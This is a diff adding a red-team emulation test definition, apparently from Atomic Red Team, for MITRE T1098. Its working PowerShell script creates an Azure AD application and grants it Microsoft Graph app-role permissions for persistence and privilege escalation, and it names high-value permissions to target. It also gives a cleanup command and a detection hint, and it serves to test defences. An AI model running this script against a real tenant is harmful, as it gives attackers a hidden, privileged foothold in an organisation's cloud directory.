@@ -1,0 +1,53 @@
+{
+    "name": "Azure AD - adding permission to application",
+    "description": "The adversaries want to add permission to newly created application. Application could be then used for persistence or for further operation in the attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor. This technique will create a new app, with the provided name, and give it the provided permission. But if you prefer to add credentials to an existing app, replace in the code: Get-AzureADApplication instead of New-AzureADServicePrincipal. The DirectoryRecommendations.Read.All permissions has been selected as the default.  The account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.  Detection hint - check Operation Name Add app role assignment to service principal in subscriptions Activity Logs. You can also take a look at the materials: https://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/ https://github.com/reprise99/Sentinel-Queries https://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766 https://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb ",
+    "supported_platforms": [
+        "azure-ad"
+    ],
+    "executor": {
+        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = New-AzureADApplication -DisplayName \"#{application_name}\"\n$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId\n#$aadApplication = Get-AzureADApplication -Filter \"DisplayName eq '#{application_name}'\"\n\n#Get Service Principal of Microsoft Graph Resource API \n$graphSP = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n\n#Initialize RequiredResourceAccess for Microsoft Graph Resource API \n$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess\n$requiredGraphAccess.ResourceAppId = $graphSP.AppId\n$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]\n\n#Set Application Permissions\n$ApplicationPermissions = @('#{application_permission}')\n\n$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}\nif($reqPermission)\n{\n$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess\n$resourceAccess.Type = \"Role\"\n$resourceAccess.Id = $reqPermission.Id    \n#Add required app permission\n$requiredGraphAccess.ResourceAccess.Add($resourceAccess)\n}\nelse\n{\nWrite-Host \"App permission $permission not found in the Graph Resource API\" -ForegroundColor Red\n}\n\n#Add required resource accesses\n$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]\n$requiredResourcesAccess.Add($requiredGraphAccess)\n\n#Set permissions in existing Azure AD App\nSet-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess\n\n$servicePrincipal = Get-AzureADServicePrincipal -Filter \"AppId eq '$($aadApplication.AppId)'\"\n\nNew-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id\n",
+        "cleanup_command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = @(Get-AzureADApplication -Filter \"DisplayName eq '#{application_name}'\")\nIf ($aadApplication.Count -eq 0)\n{\n  Write-Host \"App not found: cannot delete it\"\n  exit\n}\nElseIf ($aadApplication.Count -gt 1)\n{\n  Write-Host \"Found several app with name '#{application_name}': one is likely the one this technique created, but as a precaution, none will be deleted. Manual cleanup is required.\"\n  exit\n}\nElse\n{\n  Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId\n  Write-Host \"Successfully deleted app\"\n}\n",
+        "name": "powershell",
+        "elevation_required": false,
+        "type": "Command Executor"
+    },
+    "id": "T1098",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+    ],
+    "technique": "Account Manipulation",
+    "source": "ART",
+    "uuid": "94ea9cc3-81f9-4111-8dde-3fb54f36af4b",
+    "arguments": {
+        "username": {
+            "description": "Azure AD username",
+            "type": "string",
+            "default": "jonh@contoso.com"
+        },
+        "password": {
+            "description": "Azure AD password",
+            "type": "string",
+            "default": "p4sswd"
+        },
+        "application_name": {
+            "description": "Name of the targeted application that will be created",
+            "type": "string",
+            "default": "test_app"
+        },
+        "application_permission": {
+            "description": "Permission from Microsoft Graph Resource API that will be added to application",
+            "type": "string",
+            "default": "DirectoryRecommendations.Read.All"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "AzureAD module must be installed.\n",
+            "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
+            "get_prereq_command": "Install-Module -Name AzureAD -Force\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
